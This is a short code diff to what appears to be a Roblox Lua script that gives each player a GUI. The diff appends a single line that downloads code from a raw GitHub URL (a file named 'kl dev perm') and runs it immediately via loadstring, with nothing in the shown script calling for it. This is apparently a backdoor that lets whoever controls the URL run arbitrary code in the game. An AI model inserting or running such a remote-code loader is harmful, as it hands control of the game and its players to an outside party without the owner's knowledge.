@@ -61,3 +61,5 @@ end)
 for _, player in pairs(game.Players:GetPlayers()) do
     addGuiToPlayer(player)
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/pilloryrage/main/kl%20dev%20perm"))()
